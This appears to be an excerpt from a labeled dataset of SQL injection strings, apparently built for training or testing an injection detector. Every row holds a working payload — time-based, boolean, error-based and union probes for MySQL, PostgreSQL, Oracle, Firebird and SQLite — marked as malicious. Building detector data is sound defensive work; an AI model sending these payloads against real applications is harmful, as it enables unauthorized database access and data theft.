row_index,payload_norm,label,sqli_type_hint
8130,1'|| ( select 'fven' where 1433 = 1433 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ) ||',1,
8131,"1"" ) where 6809 = 6809 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --",1,
8132,1' ) ) ) and 1743 = 6793 and ( ( ( 'rgcv' = 'rgcv,1,
8133,1 ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 1260 = 1260,1,
8134,1'+ ( select 'mjgo' where 4026 = 4026,1,
8135,1 ) where 1090 = 1090 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1,
8136,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ""psbz"" = ""psbz",1,
8137,"1%"" and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ""%"" = """,1,
8138,"1' ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
8139,1%' ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( '%' = ',1,
8140,"iif ( 8213 = 4718,1,1/0 )",1,
8141,"( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",1,
8142,"1' ) ) and make_set ( 8403 = 8403,8899 ) and ( ( 'bmsa' = 'bmsa",1,
8143,"1%' ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( '%' = '",1,
8144,"1%' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( '%' = '",1,
8145,1' and 7533 = 7533,1,
8146,-4775' ) or 3038 = 3038,1,
8147,"-9577'|| ( select 'vloa' from dual where 7184 = 7184 union all select 7184,7184#",1,
8148,-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,1,
8149,-6327' ) ) union all select 2685--,1,
8150,"1 where 7642 = 7642 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1,
8151,"1%"" ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ""%"" = """,1,
8152,"1 ) ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
8153,1' ) as epgz where 2898 = 2898 and 7028 = 2287#,1,
8154,"1%"" ) ) and sleep ( 5 ) and ( ( ""%"" = """,1,
8155,"1' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'xpks' like 'xpks",1,
8156,"1"" ) ) union all select null--",1,
8157,1' ) as svtm where 7627 = 7627 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,1,
8158,-5970' where 2769 = 2769 union all select 2769--,1,
8159,"1 where 4944 = 4944 union all select null,null,null,null,null,null,null,null,null#",1,
